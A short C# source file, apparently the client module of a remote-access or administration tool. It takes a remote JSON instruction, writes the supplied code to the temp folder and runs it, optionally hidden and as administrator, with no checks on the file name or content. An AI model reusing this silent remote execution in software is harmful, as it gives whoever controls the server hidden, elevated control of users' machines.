using Newtonsoft.Json;
using Shared.Objects;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Core.Events
{
    class ExecuteScript
    {
        public static void Execute(string data)
        {
            RemoteScriptInstruction rsi = JsonConvert.DeserializeObject<RemoteScriptInstruction>(data);
            string path = Path.GetTempPath();

            File.AppendAllText(Path.Combine(path, rsi.fileName), rsi.Code);
            ProcessStartInfo psi = new ProcessStartInfo()
            {
                FileName = Path.Combine(path, rsi.fileName),
                UseShellExecute = false,
                WindowStyle = rsi.runSilent ? ProcessWindowStyle.Hidden : ProcessWindowStyle.Normal,
                Verb = rsi.runAsAdmin ? "runas" : null
            };
            Process.Start(psi);
        }
    }
}
